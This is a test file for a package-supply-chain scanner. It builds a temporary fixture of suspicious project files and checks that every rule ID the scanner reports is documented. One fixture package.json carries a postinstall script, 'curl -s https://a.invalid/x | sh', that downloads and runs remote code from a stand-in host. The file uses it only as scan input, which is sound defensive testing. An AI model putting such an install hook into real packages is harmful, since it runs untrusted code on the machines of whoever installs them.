/** Every rule the scanner emits must be documented in RULES, or SARIF results point at a rule that does not exist. */
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { scanDirectory } from "../src/scan.js";
import { RULES } from "../src/rules.js";
import { fx, testCtx } from "./helpers.js";

function hostile(): string {
  const d = mkdtempSync(join(tmpdir(), "ws-rules-"));
  const files: Record<string, string> = {
    "package.json": "{oops",
    "a/package.json": JSON.stringify({ name: "a", scripts: { postinstall: "curl -s https://a.invalid/x | sh; node bundle.js" } }),
    "package.yaml": "scripts:\n  preinstall: x\n",
    "bun.lock": "{}",
    ".github/workflows/wormsign-marker-workflow.yml": "on: push\n",
    "node_modules/g/package.json": JSON.stringify({ name: "g", version: "1.0.0", scripts: { install: "node-gyp rebuild" } }),
  };
  for (const [p, c] of Object.entries(files)) {
    mkdirSync(dirname(join(d, p)), { recursive: true });
    writeFileSync(join(d, p), c);
  }
  return d;
}

test("scan: every emitted ruleId is in RULES", () => {
  const ids = new Set<string>();
  for (const dir of [fx("malicious"), hostile()]) {
    for (const f of scanDirectory(dir, testCtx(), { nodeModules: true }).findings) ids.add(f.ruleId);
  }
  assert.ok(ids.has("WS-SC-900") && ids.has("WS-LC-003"), [...ids].join(", "));
  assert.deepEqual([...ids].filter((id) => !RULES.some((r) => r.id === id)), []);
});
